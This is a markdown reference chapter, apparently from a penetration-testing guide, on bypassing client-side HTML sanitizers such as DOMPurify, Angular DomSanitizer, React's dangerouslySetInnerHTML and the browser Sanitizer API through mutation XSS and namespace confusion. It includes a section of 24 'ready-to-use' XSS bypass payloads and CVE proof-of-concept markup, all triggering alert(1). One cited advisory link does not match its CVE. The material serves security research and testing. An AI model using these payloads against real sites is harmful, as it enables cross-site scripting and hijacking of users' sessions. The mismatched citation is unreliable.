# 16 - Client-Side Sanitizer Bypass

## Overview

Client-side sanitizers process HTML in the browser (or a simulated DOM) to remove dangerous elements before insertion into the page. They are the last line of defense before user-controlled content enters the live DOM. Each sanitizer implementation has unique parsing assumptions that can be exploited through mutation XSS (mXSS), namespace confusion, configuration weaknesses, and parser differential attacks.

**Sources**: [Mizu.re - Exploring DOMPurify Bypasses and Fixes](https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes), [Mizu.re - DOMPurify Misconfigurations](https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations), [Securitum Research](https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/), [PortSwigger Research](https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss)

---

## 1. DOMPurify Bypass Techniques

### Known CVEs and Historical Bypasses

**CVE-2024-47875 - Nesting-Based mXSS (CVSS 10.0)**

DOMPurify versions before 2.5.0 and 3.1.3 were vulnerable to nesting-based mutation XSS. Deeply nested structures confused the parser, causing sanitized output to mutate into executable markup upon re-insertion.

```html
<!-- CVE-2024-47875 PoC structure -->
<math><mtext><table><mglyph><svg><mtext><style><img src=x onerror=alert(1)>
</style></mtext></svg></mglyph></table></mtext></math>
```

**Source**: [GitHub Advisory GHSA-gx9m-whjm-85jf](https://github.com/advisories/GHSA-gx9m-whjm-85jf), [CVE-2024-47875 Details](https://advisories.gitlab.com/pkg/npm/dompurify/CVE-2024-47875/)

**DOMPurify < 2.0.17 - MathML Namespace Confusion**

Elements `mglyph` and `malignmark` are special in the HTML spec: they are in the MathML namespace when direct children of MathML text integration points, but switch to the HTML namespace otherwise. This namespace switching during re-serialization creates mXSS.

```html
<math><mtext><table><mglyph><svg><mtext>
<style><path id="</style><img src=x onerror=alert(1)>">
</mtext></svg></mglyph></table></mtext></math>
```

**Source**: [Securitum - Mutation XSS via MathML](https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/)

**DOMPurify 2.0.0 - Backtick Mutation**

```html
<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">
```

The SVG namespace causes the `<style>` content to be parsed as elements rather than text, and re-serialization in the HTML namespace causes the payload to escape the style tag.

**Source**: [Securitum - DOMPurify 2.0.0 Bypass](https://research.securitum.com/dompurify-bypass-using-mxss/)

**DOMPurify <= 3.1.0 - April 2024 Bypass by @IceFont**

A full bypass discovered on April 26, 2024, involving novel mutation concepts. The exploit leveraged previously unknown parsing roundtrip behaviors.

**DOMPurify <= 3.2.3 - Template Literal Regex Flaw**

A flaw in the template literal regular expression used by DOMPurify could lead to mXSS.

### Configuration-Dependent Bypasses

**Non-Default Config Bypass (DOMPurify 3.2.1, December 2024)**

When DOMPurify is configured with non-default settings (e.g., `ALLOWED_TAGS`, `ADD_TAGS`, `ALLOWED_ATTR`), the sanitization protection can be downgraded, enabling full bypass even on the latest version.

```javascript
// Vulnerable configuration example:
DOMPurify.sanitize(input, {
  ADD_TAGS: ['custom-elem'],
  ADD_ATTR: ['onclick']         // Explicitly allowing dangerous attrs
});

// OR: ALLOW_UNKNOWN_PROTOCOLS
DOMPurify.sanitize(input, {
  ALLOW_UNKNOWN_PROTOCOLS: true  // Allows javascript: URIs
});
```

**Source**: [YNizry - DOMPurify 3.2.1 Bypass](https://yaniv-git.github.io/2024/12/08/DOMPurify%203.2.1%20Bypass%20(Non-Default%20Config)/)

**RETURN_DOM and RETURN_DOM_FRAGMENT Misuse**

```javascript
// If application reads innerHTML from returned DOM:
let clean = DOMPurify.sanitize(dirty, { RETURN_DOM: true });
element.innerHTML = clean.innerHTML;  // Double serialization leads to mXSS risk
```

**FORCE_BODY: false Issues**

```javascript
// With FORCE_BODY: false, certain head-specific elements are allowed
DOMPurify.sanitize(dirty, { FORCE_BODY: false });
// May allow <style>, <link>, <meta> elements that enable CSS-based attacks
```

### mXSS Attack Patterns Against DOMPurify

The core mXSS principle: DOMPurify sanitizes a DOM tree, serializes it to a string, and the application inserts that string via `innerHTML`. If the browser parses the serialized string differently from the original tree, malicious content appears.

```
Input HTML -> Parse to DOM -> DOMPurify sanitizes tree -> Serialize to string
-> Application assigns to innerHTML -> Browser re-parses -> DIFFERENT DOM (mXSS!)
```

### Namespace Confusion Deep Dive

HTML, SVG, and MathML have different parsing rules. Switching between namespaces during serialization/reparsing can change how child elements are interpreted:

```html
<!-- In SVG namespace, <style> children are elements, not text -->
<!-- In HTML namespace, <style> children are text -->
<svg><style><a id="</style><img src=x onerror=alert(1)>"></style></svg>

<!-- Step 1: SVG parser treats content as elements - safe -->
<!-- Step 2: Serialize to string -->
<!-- Step 3: Reparse in HTML - <style> content is text until </style> is found -->
<!-- Step 4: The injected </style> closes the style, img tag executes -->
```

---

## 2. Browser Native Sanitizer API

### Specification Status

The Sanitizer API (`Element.setHTML()`) is a W3C specification that provides native browser-level sanitization. As of 2025, it is available behind flags in Chromium-based browsers and Firefox.

```javascript
// Usage:
const sanitizer = new Sanitizer({
  allowElements: ['b', 'i', 'p', 'span'],
  blockElements: ['script'],
  dropElements: ['style']
});
element.setHTML(untrustedInput, { sanitizer: sanitizer });
```

### Known Limitations and Bypasses

```javascript
// The Sanitizer API does NOT protect against DOM clobbering by default
// Elements with id/name attributes can clobber global variables
const sanitizer = new Sanitizer();
element.setHTML('<img id="cookie">', { sanitizer }); // Passes through

// Custom elements are allowed by default:
element.setHTML('<custom-xss onclick=alert(1)>click</custom-xss>');

// The Sanitizer API default configuration is still evolving
// Check browser-specific implementations for current behavior
```

**Source**: [OWASP DOM Clobbering Prevention](https://cheatsheetseries.owasp.org/cheatsheets/DOM_Clobbering_Prevention_Cheat_Sheet.html)

---

## 3. Angular DomSanitizer Bypass

### bypassSecurityTrust* Methods

Angular's DomSanitizer provides explicit bypass methods that developers misuse:

```typescript
// VULNERABLE: Developer explicitly bypasses sanitization
import { DomSanitizer } from '@angular/platform-browser';

constructor(private sanitizer: DomSanitizer) {}

// These methods TRUST the input completely:
this.sanitizer.bypassSecurityTrustHtml(userInput);       // HTML injection
this.sanitizer.bypassSecurityTrustScript(userInput);      // Script injection
this.sanitizer.bypassSecurityTrustStyle(userInput);       // CSS injection
this.sanitizer.bypassSecurityTrustUrl(userInput);         // URL injection
this.sanitizer.bypassSecurityTrustResourceUrl(userInput); // Resource URL injection
```

### Template Injection Bypass

Angular compiles templates, so if user input reaches template compilation, the entire sandbox is bypassed:

```typescript
// If user input reaches Angular template compilation:
// payload: {{constructor.constructor('alert(1)')()}}

// Server-side template injection into Angular:
// In older AngularJS (1.x) - sandbox escape:
{{$on.constructor('alert(1)')()}}
{{'a'.constructor.prototype.charAt=[].join;$on.constructor('x=alert(1)')()}}
```

### Angular [innerHTML] Property

Angular's built-in `[innerHTML]` binding automatically sanitizes, but:

```html
<!-- Angular sanitizes this automatically -->
<div [innerHTML]="userContent"></div>

<!-- BUT: Angular's sanitizer can be bypassed in specific contexts -->
<!-- SVG bindings may not be sanitized the same way -->
<svg [innerHTML]="userContent"></svg>
```

---

## 4. React Sanitization Bypass

### dangerouslySetInnerHTML

The primary XSS vector in React applications:

```jsx
// VULNERABLE: Direct user input to dangerouslySetInnerHTML
function Comment({ text }) {
  return <div dangerouslySetInnerHTML={{ __html: text }} />;
}

// Payload: <img src=x onerror=alert(1)>
// This renders and executes because React explicitly skips sanitization
```

**Source**: [LogRocket - dangerouslySetInnerHTML](https://blog.logrocket.com/using-dangerouslysetinnerhtml-react-application/), [Invicti - React XSS](https://www.invicti.com/blog/web-security/is-react-vulnerable-to-xss)

### SSR Hydration Attacks

Server-side rendering creates an HTML string that the client "hydrates" into a React application. If the server-rendered HTML contains XSS, it executes before React hydration:

```jsx
// Server-side rendering with user input:
const html = ReactDOMServer.renderToString(
  <div dangerouslySetInnerHTML={{ __html: userInput }} />
);
// The HTML is sent to the browser and parsed BEFORE React.hydrate() runs
// XSS executes immediately on page load, before any client-side protection

// Additional risk: DOMPurify is harder to use server-side (no browser DOM)
// Using jsdom or similar for SSR sanitization introduces parser differentials
```

**Source**: [Pragmatic Web Security - React XSS](https://pragmaticwebsecurity.com/articles/spasecurity/react-xss-part2.html)

### Markdown Renderer Bypasses

```jsx
// react-markdown and similar libraries may allow:
// - HTML passthrough (if configured with rehype-raw)
// - Link injection: [click](javascript:alert(1))
// - Image injection with event handlers

// marked.js without sanitization:
import { marked } from 'marked';
// <div dangerouslySetInnerHTML={{ __html: marked(userMarkdown) }} />
// Payload in markdown: <img src=x onerror=alert(1)>

// Even with sanitize option, older marked versions had bypasses
```

### Other React XSS Vectors

```jsx
// href with javascript: protocol
<a href={userInput}>Click</a>
// Payload: javascript:alert(1)

// Ref-based DOM manipulation
const ref = useRef();
ref.current.innerHTML = userInput;  // Bypasses React's escaping
```

---

## 5. Custom Sanitizer Bypass

### Regex-Based Sanitizer Weaknesses

```javascript
// Vulnerable regex: strips <script> tags
input.replace(/<script[^>]*>.*?<\/script>/gi, '');

// Bypass 1: Newlines in tag
// <script
// >alert(1)</script>

// Bypass 2: Attributes break regex
// <script/src=x>alert(1)</script>

// Bypass 3: Non-script vectors entirely avoid the regex
// <img src=x onerror=alert(1)>
// <svg onload=alert(1)>
```

### Blacklist vs Whitelist Failures

```javascript
// Blacklist approach (ALWAYS bypassable):
const blacklist = ['script', 'iframe', 'object', 'embed'];
// Miss: <svg onload=alert(1)>, <img onerror=alert(1)>,
//        <details ontoggle=alert(1)>, <video onerror=alert(1)>

// Even extensive blacklists miss new HTML elements and events
// Whitelist is always preferred but can still have issues:
const allowedTags = ['p', 'b', 'i', 'a', 'img'];
const allowedAttrs = ['href', 'src', 'alt'];
// Miss: <a href="javascript:alert(1)">  (need to validate URL scheme)
```

### Recursive Sanitization Bypass (Strip Once, Payload Reconstructs)

```html
<!-- If sanitizer strips "script" once: -->
<scrscriptipt>alert(1)</scrscriptipt>
<!-- strips "script" then becomes: <script>alert(1)</script> -->

<!-- If sanitizer strips "onerror" once: -->
<img src=x ononerrorerror=alert(1)>
<!-- strips "onerror" then becomes: <img src=x onerror=alert(1)> -->

<!-- Nested stripping: -->
<scr<script>ipt>alert(1)</scr</script>ipt>
<!-- strips inner <script></script> then becomes: <script>alert(1)</script> -->

<!-- Double encoding with strip: -->
<img src=x on&#101;rror=alert(1)>
<!-- Sanitizer may not decode entities before checking -->
```

### Mutation-Based Bypass

```javascript
// Sanitize step: parse HTML, check DOM tree, serialize back
// The serialized output may differ from the original input
// If the application assigns serialized output to innerHTML:

// Example: sanitizer allows <math> and <style>
// Input: <math><mtext><style><img src=x onerror=alert(1)></style></mtext></math>
// Sanitizer DOM: style contains text node (safe)
// innerHTML serialization: outputs the text literally
// Browser re-parse: img tag escapes style context -> XSS
```

---

## 6. Sanitizer Bypass Payloads (20+ Ready-to-Use)

### DOMPurify Bypass Payloads

```html
<!-- 1. Namespace confusion (pre-2.0.17) -->
<math><mtext><table><mglyph><svg><mtext><style><img src=x onerror=alert(1)></style></mtext></svg></mglyph></table></mtext></math>

<!-- 2. SVG foreignObject escape -->
<svg><foreignObject><body><img src=x onerror=alert(1)></body></foreignObject></svg>

<!-- 3. SVG style escape -->
<svg><style><a id="</style><img src=x onerror=alert(1)>"></style></svg>

<!-- 4. Nesting-based mXSS (CVE-2024-47875) -->
<math><mtext><table><mglyph><svg><mtext><style><!--</style><img src=x onerror=alert(1)>--></style></mtext></svg></mglyph></table></mtext></math>

<!-- 5. ALLOW_UNKNOWN_PROTOCOLS misconfiguration -->
<a href="javascript:alert(1)">click</a>
<!-- (only works if ALLOW_UNKNOWN_PROTOCOLS: true) -->

<!-- 6. ADD_TAGS misconfiguration -->
<iframe srcdoc="<script>alert(1)</script>">
<!-- (only works if iframe is in ADD_TAGS) -->
```

### Angular Sanitizer Bypass Payloads

```html
<!-- 7. AngularJS sandbox escape (1.x) -->
{{constructor.constructor('alert(1)')()}}

<!-- 8. Angular template injection -->
{{$on.constructor('alert(1)')()}}

<!-- 9. SVG context bypass -->
<svg><a><animate attributeName="href" values="javascript:alert(1)"/><text x="20" y="20">Click</text></a></svg>

<!-- 10. Angular [innerHTML] with SVG -->
<div [innerHTML]="'<svg onload=alert(1)>'"></div>
```

### React Bypass Payloads

```jsx
// 11. dangerouslySetInnerHTML
// <div dangerouslySetInnerHTML={{__html: '<img src=x onerror=alert(1)>'}} />

// 12. javascript: in href
// <a href="javascript:alert(1)">click</a>

// 13. Ref-based injection
// ref.current.innerHTML = '<img src=x onerror=alert(1)>';

// 14. SSR hydration (server-rendered XSS)
// Server sends: <div><img src=x onerror=alert(1)></div>
// Executes before React.hydrate()
```

### Custom Sanitizer Bypass Payloads

```html
<!-- 15. Recursive strip bypass -->
<scrscriptipt>alert(1)</scrscriptipt>

<!-- 16. Event handler reconstruction -->
<img src=x ononerrorerror=alert(1)>

<!-- 17. Case manipulation -->
<SCRIPT>alert(1)</SCRIPT>

<!-- 18. Entity encoding bypass -->
<img src=x on&#101;rror=alert(1)>

<!-- 19. Null byte insertion -->
<scr%00ipt>alert(1)</script>

<!-- 20. Tag within tag -->
<scr<script>ipt>alert(1)</scr</script>ipt>

<!-- 21. data: URI bypass (if URLs not validated) -->
<a href="data:text/html,<script>alert(1)</script>">click</a>

<!-- 22. SVG use element -->
<svg><use href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><image href='1' onerror='alert(1)'/></svg>#x" />

<!-- 23. Object with data: URI -->
<object data="javascript:alert(1)">

<!-- 24. Meta refresh (if meta allowed) -->
<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
```

---

## Testing Methodology

1. **Identify the sanitizer**: Check for DOMPurify, Sanitizer API, or framework-specific sanitizers in JavaScript bundles
2. **Check version**: Known CVE-based bypasses are version-specific
3. **Check configuration**: Look for `ADD_TAGS`, `ADD_ATTR`, `ALLOW_UNKNOWN_PROTOCOLS`, `FORCE_BODY` settings
4. **Test namespace confusion**: Math/SVG nested payloads that exploit serialization/reparsing differences
5. **Test mXSS**: Payloads that are safe in the DOM tree but mutate during innerHTML round-trips
6. **Test custom element interaction**: Custom elements may bypass sanitizer allow-lists
7. **Test framework-specific vectors**: dangerouslySetInnerHTML, bypassSecurityTrust*, template injection
8. **Test recursive stripping**: Payloads that reconstruct after one strip pass
9. **Fuzz with mutation payloads**: Systematically vary nesting depth, namespace switches, and entity encoding

---

## References

- [Mizu.re - Exploring DOMPurify Bypasses and Fixes](https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes)
- [Mizu.re - DOMPurify Misconfigurations](https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations)
- [Securitum - Mutation XSS via MathML](https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/)
- [Securitum - DOMPurify 2.0.0 Bypass](https://research.securitum.com/dompurify-bypass-using-mxss/)
- [PortSwigger - Bypassing DOMPurify with mXSS](https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss)
- [GitHub Advisory - CVE-2024-47875](https://github.com/advisories/GHSA-gx9m-whjm-85jf)
- [YNizry - DOMPurify 3.2.1 Non-Default Config Bypass](https://yaniv-git.github.io/2024/12/08/DOMPurify%203.2.1%20Bypass%20(Non-Default%20Config)/)
- [Daniel Santos - SVG Namespace Confusion DOMPurify < 2.2.2](https://vovohelo.medium.com/from-svg-and-back-yet-another-mutation-xss-via-namespace-confusion-for-dompurify-2-2-2-bypass-5d9ae8b1878f)
- [OWASP DOM Clobbering Prevention](https://cheatsheetseries.owasp.org/cheatsheets/DOM_Clobbering_Prevention_Cheat_Sheet.html)
- [Invicti - React XSS Vulnerabilities](https://www.invicti.com/blog/web-security/is-react-vulnerable-to-xss)
- [Pragmatic Web Security - React XSS Part 2](https://pragmaticwebsecurity.com/articles/spasecurity/react-xss-part2.html)

---
## [2024-2026 Research Update]

### New DOMPurify CVEs (2024-2026)

The following CVEs represent a sustained stream of DOMPurify bypasses from 2024 through 2026, with root causes spanning nesting-based mXSS, prototype pollution, namespace confusion, template/shadow DOM traversal gaps, and configuration precedence errors. Upgrading to at least DOMPurify 3.4.15 is necessary to address all known issues.

**CVE-2024-45801 (September 2024) - Nesting-Based mXSS**

Special nesting bypassed DOMPurify's depth check, allowing deeply nested structures to produce a different DOM tree after serialize-reparse. Fixed in DOMPurify 2.5.4 and 3.1.3.

**Source**: [SentinelOne CVE Database](https://www.sentinelone.com/vulnerability-database/cve-2024-45801/), [DOMPurify Wiki](https://github.com/cure53/DOMPurify/wiki/Attack-Classes-&-Bypass-History)

**CVE-2025-15599 (published 2026) - Textarea Rawtext Bypass in SAFE_FOR_XML Mode**

The SAFE_FOR_XML regex omitted some rawtext element names (e.g., textarea), allowing attribute values to escape their context via closing tag injection. Fixed in 3.2.7 (3.x branch); the 2.x branch was never patched.

```html
<!-- Rawtext element breakout via closing tag injection in SAFE_FOR_XML mode -->
<textarea></textarea><img src=x onerror=alert(1)>
```

**Source**: [VulnCheck Advisory](https://www.vulncheck.com/advisories/dompurify-xss-via-textarea-rawtext-bypass-in-safe-for-xml), [GitHub Advisory GHSA-v8jm-5vwx-cfxm](https://github.com/advisories/GHSA-v8jm-5vwx-cfxm)

**CVE-2025-26791 (2025) - Template Reassembly Bypass**

Removing elements and merging text nodes rebuilt a template expression. Root cause: incorrect `${ ... }` handling during node removal. Fixed in 3.2.4.

```html
<!-- Template expression reassembly after node removal -->
<div id=app>{<foo></foo>{constructor.constructor("alert(1)")()}<foo></foo>}</div>
```

**Source**: [DOMPurify Wiki](https://github.com/cure53/DOMPurify/wiki/Attack-Classes-&-Bypass-History)

**CVE-2026-0540 (2026) - SAFE_FOR_XML Attribute Regex Omission**

SAFE_FOR_XML attribute regex omitted some rawtext element names, enabling mXSS via rawtext/RCDATA breakouts with noscript, textarea, and style attribute-selector variants.

```html
<!-- Rawtext/RCDATA breakout via noscript -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```

**Source**: [DOMPurify Wiki](https://github.com/cure53/DOMPurify/wiki/Attack-Classes-&-Bypass-History)

**CVE-2026-41238 (GHSA-v9jr-rg53-9pgp, 2026) - Prototype Pollution to XSS**

Prototype pollution via CUSTOM_ELEMENT_HANDLING fallback. After `Object.prototype.tagNameCheck = /.*/` and `Object.prototype.attributeNameCheck = /.*/`, the payload survives sanitization. Root cause: an inherited `|| {}` fallback in the CUSTOM_ELEMENT_HANDLING code path. Affected 3.0.1 through 3.3.3. Fixed in 3.4.0.

```html
<!-- Requires prior prototype pollution -->
<!-- Object.prototype.tagNameCheck = /.*/ -->
<!-- Object.prototype.attributeNameCheck = /.*/ -->
<x-x autofocus tabindex=0 onfocus=alert(1)>
```

**Source**: [GitHub Advisory GHSA-v9jr-rg53-9pgp](https://github.com/advisories/GHSA-v9jr-rg53-9pgp), [GitLab Advisory](https://advisories.gitlab.com/npm/dompurify/CVE-2026-49978/)

**CVE-2026-47423 (GHSA-87xg-pxx2-7hvx, 2026) - selectedcontent Element Bypass**

The browser (Chrome 130+) re-clones option content after the sanitizer's walk, reintroducing unsanitized nodes. Affected DOMPurify 3.4.4. Fixed in 3.4.5.

```html
<!-- selectedcontent re-cloning bypass (Chrome 130+) -->
<select><button><selectedcontent></selectedcontent></button><option selected=javascript:1><img src=x onerror=alert(1)>x</option></select>
```

**Source**: [DOMPurify Wiki](https://github.com/cure53/DOMPurify/wiki/Attack-Classes-&-Bypass-History)

**CVE-2026-49978 (2026) - IN_PLACE Shadow Root Bypass**

Content inside a template's shadow root was skipped during IN_PLACE sanitization. All versions before 3.4.7 are affected. Fixed in 3.4.7.

**Source**: [GitLab Advisory](https://advisories.gitlab.com/npm/dompurify/CVE-2026-49978/)

**CVE-2026-66010 (2026) - Hooks Skipped for Custom Elements**

Hooks skipped for some custom elements during afterSanitizeElements. Reported by @Rikuxx0. Fixed in 3.4.12. Related: GHSA-c2j3-45gr-mqc4.

**Source**: [DOMPurify Wiki](https://github.com/cure53/DOMPurify/wiki/Attack-Classes-&-Bypass-History)

### Additional Hardening Fixes (No CVE, 2026)

- **GHSA-cj63-jhhr-wcxv**: USE_PROFILES array pollution, fixed in 3.3.2.
- **GHSA-76mc-f452-cxcm** (fixed 3.4.7) and **GHSA-cmwh-pvxp-8882** (fixed 3.4.11): allow-list objects shared across calls.
- **3.4.13**: depth-limit flattening fix (moved children instead of cloning during KEEP_CONTENT hoisting), DOM clobbering fix (ownerDocument read through cached getter).
- **3.4.14-3.4.15**: mixed document context fixes (case-sensitive attribute handling in XHTML, node-built style/xmp elements with injected text nodes), removeAttributeNode/getAttributeNode called via cached prototypes against DOM clobbering.

### Key Observations

- The frequency of DOMPurify CVEs has accelerated in 2025-2026, reflecting both increased scrutiny from security researchers and expanding browser attack surface (e.g., selectedcontent, declarative partial updates).
- Prototype pollution as an XSS gadget via DOMPurify (CVE-2026-41238) is a significant class because any upstream prototype pollution vulnerability in the application can be turned into XSS.
- Server-side usage of DOMPurify (via jsdom) has a fundamentally different parser than browsers, creating a distinct class of bypasses (noscript parsing differences, missing form clobbering).

### Updated References

- [DOMPurify Wiki - Attack Classes & Bypass History](https://github.com/cure53/DOMPurify/wiki/Attack-Classes-&-Bypass-History)
- [GitHub Advisory GHSA-v9jr-rg53-9pgp](https://github.com/advisories/GHSA-v9jr-rg53-9pgp)
- [GitHub Advisory GHSA-87xg-pxx2-7hvx](https://github.com/advisories/GHSA-87xg-pxx2-7hvx)
- [VulnCheck Advisory - CVE-2025-15599](https://www.vulncheck.com/advisories/dompurify-xss-via-textarea-rawtext-bypass-in-safe-for-xml)
- [GitLab Advisory - CVE-2026-49978](https://advisories.gitlab.com/npm/dompurify/CVE-2026-49978/)
